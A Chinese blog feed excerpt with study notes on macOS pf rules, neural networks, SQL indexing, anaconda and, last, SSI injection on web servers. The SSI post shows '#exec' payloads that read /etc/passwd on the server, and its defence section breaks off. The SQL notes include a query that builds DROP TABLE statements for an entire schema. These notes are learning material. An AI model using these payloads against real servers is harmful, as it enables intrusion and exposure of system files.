<h2 id="2-配置端口转发等规则-pf"><a href="#2-配置端口转发等规则-pf" class="headerlink" title="2. 配置端口转发等规则 pf"></a>2. 配置端口转发等规则 pf</h2><h3 id="2-1-查看pf状态"><a href="#2-1-查看pf状态" class="headerlink" title="2.1. 查看pf状态"></a>2.1. 查看pf状态</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Status代表pf规则是否生效</span></span><br><span class="line">=&gt; sudo pfctl -s info</span><br><span class="line">Password:</span><br><span class="line">No ALTQ support in kernel</span><br><span class="line">ALTQ related functions disabled</span><br><span class="line">Status: Enabled for 0 days 00:06:58     Debug: Urgent</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看具体pf规则</span></span><br><span class="line">=&gt; sudo pfctl -sr</span><br><span class="line">No ALTQ support in kernel</span><br><span class="line">ALTQ related functions disabled</span><br><span class="line">pass out route-to utun7 inet proto udp from any to 172.22.230.61 port = 53 group != 18358 keep state</span><br><span class="line">pass out route-to utun7 inet proto udp from any to 172.22.228.106 port = 53 group != 18358 keep state</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
  </entry>
  <entry>
    <title>有关人工智能的随笔</title>
    <url>/blogs/2021-11-03-AI-thoughts/</url>
    <content><![CDATA[<h1 id="2021-11-03-神经网络算法研究和工程开发"><a href="#2021-11-03-神经网络算法研究和工程开发" class="headerlink" title="2021.11.03 神经网络算法研究和工程开发"></a>2021.11.03 神经网络算法研究和工程开发</h1><h2 id="1-神经网络算法研究"><a href="#1-神经网络算法研究" class="headerlink" title="1. 神经网络算法研究"></a>1. 神经网络算法研究</h2><ul>
<li>对于神经网络的各个算法来讲，AI的算法主要依赖于对于现有场景的数学抽象，根据对应的数学模型找到特定的算法对应，根据输出反向求导进行训练，最终让算法中的参数趋于真实值</li>
<li>举个例子</li>
</ul>
<p><strong>卷积神经网络</strong></p>
<ul>
<li>图像的抽象就是像素点</li>
<li>图像中的信息依赖于各个像素点之间的位置关系</li>
<li>使用普通的相乘相加无法得到位置关系，但是使用卷积就可以将图像的位置关系进行抽象</li>
<li>对于一组图像，不同的图像具有不同的特征，所以卷积的filter也就需要多样化，所以卷积层存在一个高度表示不同的特征</li>
</ul>
<p><strong>长短时记忆神经网络（LSTM）</strong></p>
<ul>
<li>语言本身不能直接进入网络进行计算，所以对每个词组进行抽象编号，作为输入</li>
<li>语言具有上下文关系，所以需要进行循环处理</li>
<li>既要根据当前词的前后进行推导，又可能对于很早之前的语句进行推导，所以要引入一个长久保持的状态量，和一个短期的状态量</li>
<li>为了不让很早之前的无关量进行误导，所以要引入遗忘</li>
</ul>
<h2 id="2-工程开发"><a href="#2-工程开发" class="headerlink" title="2. 工程开发"></a>2. 工程开发</h2><ul>
<li>在处理真实场景时，主要还是对输入进行抽象成数学模型</li>
<li>根据其中各个输入量之间的关系，调整模型或对数据预处理</li>
<li>整个神经网络搭建可能牵扯到多个类型网络结合等</li>
<li>各个超参数的调整却又需要根据实验进行分析总结，并不是直接就可以推导出来需要设置为多少</li>
</ul>
]]></content>
      <categories>
        <category>Essay</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>sql语法相关学习笔记</title>
    <url>/blogs/2021-10-18-sql/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h1><h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1. 基础语法"></a>1. 基础语法</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 这是注释</span></span><br></pre></td></tr></table></figure>

<h2 id="2-select"><a href="#2-select" class="headerlink" title="2. select"></a>2. select</h2><h3 id="2-1-order-by-排序"><a href="#2-1-order-by-排序" class="headerlink" title="2.1. order by 排序"></a>2.1. order by 排序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 根据某一列排序（列名）</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_test <span class="keyword">order</span> <span class="keyword">by</span> id</span><br><span class="line"><span class="comment">-- 根据某一列排序（序号）</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_test <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h4 id="1-order-by什么情况下会使用索引进行排序"><a href="#1-order-by什么情况下会使用索引进行排序" class="headerlink" title="1) order by什么情况下会使用索引进行排序"></a>1) order by什么情况下会使用索引进行排序</h4><ul>
<li>正常直接<code>order by</code>是不会使用索引进行排序的，当<code>order by</code>的字段在<code>where</code>中则会使用索引进行排序</li>
<li>测试得到如下四个结果<ul>
<li><code>order by</code>的字段不在where条件不在select中，有排序操作</li>
<li><code>order by</code>的字段不在where条件但在select中，有排序操作</li>
<li><code>order by</code>的字段在where条件但不在select中，无排序操作，使用索引排序后查数据</li>
<li><code>order by</code>的字段在where条件但不在select中(倒序) ，无排序操作，使用索引排序后查数据</li>
</ul>
</li>
</ul>
<p><strong>原因</strong></p>
<p>sql处理分为三个阶段：</p>
<ol>
<li>根据where条件和统计信息生成执行计划</li>
<li>处理数据</li>
<li>返回数据</li>
</ol>
<p>当第二步要对数据进行排序时，发现第一步执行计划中使用到了索引，而索引正好是排序字段，则直接使用索引进行排序</p>
<h4 id="2-where和order-by字段不一样如何使用索引排序"><a href="#2-where和order-by字段不一样如何使用索引排序" class="headerlink" title="2) where和order by字段不一样如何使用索引排序"></a>2) where和order by字段不一样如何使用索引排序</h4><ul>
<li>需要添加联合索引，并且联合索引要求where中的字段在前面，order by中的字段在后面</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 直接执行where配合查询，不会使用索引排序，直接内存排序</span></span><br><span class="line">mysql<span class="operator">&gt;</span> explain <span class="keyword">select</span> name <span class="keyword">from</span> resource <span class="keyword">where</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> select_type <span class="operator">|</span> <span class="keyword">table</span>    <span class="operator">|</span> partitions <span class="operator">|</span> type <span class="operator">|</span> possible_keys   <span class="operator">|</span> key             <span class="operator">|</span> key_len <span class="operator">|</span> <span class="keyword">ref</span>   <span class="operator">|</span> <span class="keyword">rows</span> <span class="operator">|</span> filtered <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> SIMPLE      <span class="operator">|</span> resource <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">ref</span>  <span class="operator">|</span> resource_status <span class="operator">|</span> resource_status <span class="operator">|</span> <span class="number">5</span>       <span class="operator">|</span> const <span class="operator">|</span>   <span class="number">24</span> <span class="operator">|</span>   <span class="number">100.00</span> <span class="operator">|</span> <span class="keyword">Using</span> filesort <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加order by的字段在前的索引，还是使用内存排序，不会使用索引</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> index name_status <span class="keyword">on</span> resource (name, status);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">1.50</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> explain <span class="keyword">select</span> name <span class="keyword">from</span> resource <span class="keyword">where</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> select_type <span class="operator">|</span> <span class="keyword">table</span>    <span class="operator">|</span> partitions <span class="operator">|</span> type <span class="operator">|</span> possible_keys               <span class="operator">|</span> key             <span class="operator">|</span> key_len <span class="operator">|</span> <span class="keyword">ref</span>   <span class="operator">|</span> <span class="keyword">rows</span> <span class="operator">|</span> filtered <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> SIMPLE      <span class="operator">|</span> resource <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">ref</span>  <span class="operator">|</span> resource_status,name_status <span class="operator">|</span> resource_status <span class="operator">|</span> <span class="number">5</span>       <span class="operator">|</span> const <span class="operator">|</span>   <span class="number">24</span> <span class="operator">|</span>   <span class="number">100.00</span> <span class="operator">|</span> <span class="keyword">Using</span> filesort <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-----------------+---------+-------+------+----------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> resource <span class="keyword">drop</span> index name_status;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.27</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加where字段在前的索引，就会使用索引进行排序</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> index status_name <span class="keyword">on</span> resource (status, name);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.52</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> explain <span class="keyword">select</span> name <span class="keyword">from</span> resource <span class="keyword">where</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-------------+---------+-------+------+----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> select_type <span class="operator">|</span> <span class="keyword">table</span>    <span class="operator">|</span> partitions <span class="operator">|</span> type <span class="operator">|</span> possible_keys               <span class="operator">|</span> key         <span class="operator">|</span> key_len <span class="operator">|</span> <span class="keyword">ref</span>   <span class="operator">|</span> <span class="keyword">rows</span> <span class="operator">|</span> filtered <span class="operator">|</span> Extra       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-------------+---------+-------+------+----------+-------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> SIMPLE      <span class="operator">|</span> resource <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">ref</span>  <span class="operator">|</span> resource_status,status_name <span class="operator">|</span> status_name <span class="operator">|</span> <span class="number">5</span>       <span class="operator">|</span> const <span class="operator">|</span>   <span class="number">24</span> <span class="operator">|</span>   <span class="number">100.00</span> <span class="operator">|</span> <span class="keyword">Using</span> index <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------------+----------+------------+------+-----------------------------+-------------+---------+-------+------+----------+-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="2-2-union-联表"><a href="#2-2-union-联表" class="headerlink" title="2.2. union 联表"></a>2.2. union 联表</h3><ul>
<li>union 将两个表的数据合并，需要保证列数一致</li>
<li>会使用第一个 select 对应的列，第二个 select 仅留下数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将两个表的数据合并，只列出不同的值</span></span><br><span class="line"><span class="keyword">select</span> column1 <span class="keyword">from</span> table1</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> column1 <span class="keyword">from</span> table2</span><br><span class="line"><span class="comment">-- 允许有相同的值</span></span><br><span class="line"><span class="keyword">select</span> column1 <span class="keyword">from</span> table1</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> column1 <span class="keyword">from</span> table2</span><br></pre></td></tr></table></figure>

<h3 id="2-3-distinct-去重"><a href="#2-3-distinct-去重" class="headerlink" title="2.3. distinct 去重"></a>2.3. distinct 去重</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> name <span class="keyword">from</span> table1;</span><br></pre></td></tr></table></figure>

<h3 id="2-4-group-by-统计"><a href="#2-4-group-by-统计" class="headerlink" title="2.4. group by 统计"></a>2.4. group by 统计</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> count <span class="keyword">from</span> table1 <span class="keyword">group</span> <span class="keyword">by</span> name <span class="keyword">order</span> <span class="keyword">by</span> count;</span><br></pre></td></tr></table></figure>

<h3 id="2-5-where"><a href="#2-5-where" class="headerlink" title="2.5. where"></a>2.5. where</h3><h4 id="1-null判断"><a href="#1-null判断" class="headerlink" title="(1) null判断"></a>(1) null判断</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> table1 <span class="keyword">where</span> id <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> table1 <span class="keyword">where</span> id <span class="keyword">is</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<h3 id="2-6-concat-字符串拼接"><a href="#2-6-concat-字符串拼接" class="headerlink" title="2.6. concat 字符串拼接"></a>2.6. concat 字符串拼接</h3><ul>
<li>将查询结果拼接其他字符串展示</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat(<span class="string">&#x27;DROP TABLE IF EXISTS &#x27;</span>, table_name, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"><span class="keyword">FROM</span> information_schema.tables</span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;mydb&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-truncate"><a href="#3-truncate" class="headerlink" title="3. truncate"></a>3. truncate</h2><h3 id="3-1-用法"><a href="#3-1-用法" class="headerlink" title="3.1. 用法"></a>3.1. 用法</h3><ul>
<li>删除一个表里面所有数据</li>
<li>sqlite不支持此命令</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> [table_name]</span><br><span class="line"><span class="comment">--也可以不带table</span></span><br><span class="line"><span class="keyword">truncate</span> [table_name]</span><br></pre></td></tr></table></figure>

<h3 id="3-2-truncate-和-delete-的区别"><a href="#3-2-truncate-和-delete-的区别" class="headerlink" title="3.2. truncate 和 delete 的区别"></a>3.2. truncate 和 delete 的区别</h3><table>
<thead>
<tr>
<th></th>
<th>truncate</th>
<th>delete</th>
</tr>
</thead>
<tbody><tr>
<td>功能</td>
<td>删除表的所有数据</td>
<td>可以删除所有，也可以只删除部分</td>
</tr>
<tr>
<td>行为</td>
<td>删除内容，不删除表，释放空间</td>
<td>删除内容，不删除表，不释放空间</td>
</tr>
<tr>
<td>速度</td>
<td>快</td>
<td>慢</td>
</tr>
<tr>
<td>日志</td>
<td>一条页的释放日志</td>
<td>一条一条删，每行都有日志</td>
</tr>
<tr>
<td>能否恢复</td>
<td>由于空间被释放，无法恢复</td>
<td>可以被回滚</td>
</tr>
</tbody></table>
<h2 id="4-replace"><a href="#4-replace" class="headerlink" title="4. replace"></a>4. replace</h2><h3 id="4-1-基础用法"><a href="#4-1-基础用法" class="headerlink" title="4.1. 基础用法"></a>4.1. 基础用法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace <span class="keyword">into</span> emm_data</span><br><span class="line">    (`path`, `size`, `modify`) <span class="keyword">value</span>(<span class="string">&#x27;/a/b/c&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;2022-02-22 22:22:22&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="二、特定数据库软件"><a href="#二、特定数据库软件" class="headerlink" title="二、特定数据库软件"></a>二、特定数据库软件</h1><h2 id="2-sqlite3"><a href="#2-sqlite3" class="headerlink" title="2. sqlite3"></a>2. sqlite3</h2><h3 id="2-1-系统表"><a href="#2-1-系统表" class="headerlink" title="2.1. 系统表"></a>2.1. 系统表</h3><h4 id="1-sqlite-master"><a href="#1-sqlite-master" class="headerlink" title="(1) sqlite_master"></a>(1) <code>sqlite_master</code></h4><p>sqlite数据库有一个系统表<code>sqlite_master</code>储存了数据库表的信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlite<span class="operator">&gt;</span> .mod line</span><br><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqlite_master;</span><br><span class="line">    type <span class="operator">=</span> <span class="keyword">table</span></span><br><span class="line">    name <span class="operator">=</span> task</span><br><span class="line">tbl_name <span class="operator">=</span> task</span><br><span class="line">rootpage <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">     <span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `task` (</span><br><span class="line">  `id` <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">    type <span class="operator">=</span> <span class="keyword">table</span></span><br><span class="line">    name <span class="operator">=</span> sqlite_sequence</span><br><span class="line">tbl_name <span class="operator">=</span> sqlite_sequence</span><br><span class="line">rootpage <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">     <span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(name,seq)</span><br></pre></td></tr></table></figure>

<h4 id="2-sqlite-sequence"><a href="#2-sqlite-sequence" class="headerlink" title="(2) sqlite_sequence"></a>(2) <code>sqlite_sequence</code></h4><p><code>sqlite_sequence</code>表也是SQLite的系统表。该表用来保存其他表的RowID的最大值。数据库被创建时，<code>sqlite_sequence</code>表会被自动创建。该表包括两列。第一列为name，用来存储表的名称。第二列为seq，用来保存表对应的RowID的最大值。该值最大值为9223372036854775807。当对应的表增加记录，该表会自动更新。当表删除，该表对应的记录也会自动删除。如果该值超过最大值，会引起<code>SQL_FULL</code>错误。所以，一旦发现该错误，用户不仅要检查SQLite文件所在的磁盘空间是否不足，还需要检查是否有表的ROWID达到最大值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlite<span class="operator">&gt;</span> .mod line</span><br><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqlite_sequence;</span><br><span class="line"> name <span class="operator">=</span> task</span><br><span class="line">  seq <span class="operator">=</span> <span class="number">13</span></span><br></pre></td></tr></table></figure>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>anaconda学习记录</title>
    <url>/blogs/2021-10-16-anaconda/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python 3.6.4</span><br></pre></td></tr></table></figure>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>anaconda是一个python环境管理工具，可以很方便创建不同版本的python环境</p>
<h1 id="一、几种基本命令"><a href="#一、几种基本命令" class="headerlink" title="一、几种基本命令"></a>一、几种基本命令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">非conda环境下始能base环境</span></span><br><span class="line">source /opt/anaconda/bin/activate base</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">             <span class="built_in">env</span>操作               <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 创建 ##########</span></span></span><br><span class="line">conda create -n [name] python=[version]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举所有<span class="built_in">env</span></span></span><br><span class="line">conda env list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 操作 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用某个<span class="built_in">env</span></span></span><br><span class="line">conda activate [name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给某个<span class="built_in">env</span>安装一个包，相当于activate后使用pip安装</span></span><br><span class="line">conda install -n [env_name] [package_name]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除某个<span class="built_in">env</span></span></span><br><span class="line">conda env remove -n [name]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">            conda本身操作           <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 更新 ##########</span></span></span><br><span class="line">conda upgrade conda     # 更新conda的版本</span><br><span class="line">conda update anaconda   # 更新anaconda的版本</span><br><span class="line">conda install python    # 更新base的python版本</span><br></pre></td></tr></table></figure>

<h1 id="二、更换软件源"><a href="#二、更换软件源" class="headerlink" title="二、更换软件源"></a>二、更换软件源</h1><ul>
<li>先执行下面命令，生成一个<code>.condarc</code>文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></table></figure>

<ul>
<li>然后修改里面的内容如下即可</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">show_channel_urls:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">default_channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span></span><br><span class="line"><span class="attr">custom_channels:</span></span><br><span class="line">  <span class="attr">pkgs/main:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda</span></span><br><span class="line">  <span class="attr">pkgs/r:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda</span></span><br><span class="line">  <span class="attr">pkgs/pro:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>web攻防相关知识</title>
    <url>/blogs/2021-09-23-web-offense-and-defense/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一些攻防相关的web知识</p>
<p><strong>学习网站</strong></p>
<ul>
<li>(hackthissite)[<a href="https://www.hackthissite.org/]">https://www.hackthissite.org/]</a> + Baidu</li>
</ul>
<h1 id="一、特定语言的攻防"><a href="#一、特定语言的攻防" class="headerlink" title="一、特定语言的攻防"></a>一、特定语言的攻防</h1><h2 id="1-shtml-可以执行SSI指令的前端页面"><a href="#1-shtml-可以执行SSI指令的前端页面" class="headerlink" title="1. shtml 可以执行SSI指令的前端页面"></a>1. shtml 可以执行SSI指令的前端页面</h2><p>参考链接: <a href="https://blog.csdn.net/dadou2007/article/details/2521365">HTML语言SSI指令语法</a></p>
<h3 id="1-1-攻"><a href="#1-1-攻" class="headerlink" title="1.1. 攻"></a>1.1. 攻</h3><h4 id="SSI指令"><a href="#SSI指令" class="headerlink" title="SSI指令"></a>SSI指令</h4><p>SSI（Server Side Include），当客户端访问这些shtml文件时，服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来比如：你可以在SHTML文件中用SSI指令引用其他的html文件（#include ），服务器传送给客户端的文件，是已经解释的SHTML不会有SSI指令。它实现了HTML所没有的功能，就是可以实现了动态的SHTML，可以说是HTML的一种进化吧。像新浪的新闻系统就是这样的，新闻内容是固定的但它上面的广告和菜单等就是用#include引用进来的</p>
<p>目前，主要有以下几种用用途：</p>
<ol>
<li>显示服务器端环境变量&lt;#echo&gt;</li>
<li>将文本内容直接插入到文档中&lt;#include&gt;</li>
<li>显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期&#x2F;大小等)</li>
<li>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</li>
<li>设置SSI信息显示格式&lt;#config&gt;(如文件制作日期&#x2F;大小显示方式)</li>
</ol>
<p>高级SSI<code>&lt;XSSI&gt;</code>可设置变量使用if条件语句。</p>
<h5 id="几种ssi指令实例和解析"><a href="#几种ssi指令实例和解析" class="headerlink" title="几种ssi指令实例和解析"></a>几种ssi指令实例和解析</h5><p><strong>#include</strong></p>
<ul>
<li>file: 文件名是一个相对路径，该路径相对于使用 #include 指令的文档所在的目录。被包含文件可以在同一级目录或其子目录中，但不能在上一级目录中。如表示当前目录下的的nav_head.htm文档，则为file&#x3D;”nav_head.htm”。</li>
<li>virtual: 文件名是 Web 站点上的虚拟目录的完整路径。如表示相对于服务器文档根目录下hoyi目录下的nav_head.htm文件；则为file&#x3D;”&#x2F;hoyi&#x2F;nav_head.htm”</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include file=&quot;info.htm&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;文件名称&quot;--&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>#echo</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">本文档名称</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">现在时间</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">你的IP地址</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>#flastmod和#fsize</strong></p>
<ul>
<li>flastmod: 上次更改时间</li>
<li>fsize: 文件大小</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#flastmod file=&quot;文件名称&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>#exec</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span>          将会显示密码文件</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;dir /b&quot;--&gt;</span>                   将会显示当前目录下文件列表</span><br><span class="line"><span class="comment">&lt;!--#exec cgi=&quot;/cgi-bin/gb.cgi&quot;--&gt;</span>          将会执行CGI程序gb.cgi</span><br></pre></td></tr></table></figure>

<h3 id="1-2-防"><a href="#1-2-防" class="headerlink" title="1.2. 防"></a>1.2. 防</h3><ul>
<li>需要在web服务端配置拦截</li>
</ul>
<p><strong>nginx配置</strong></p>
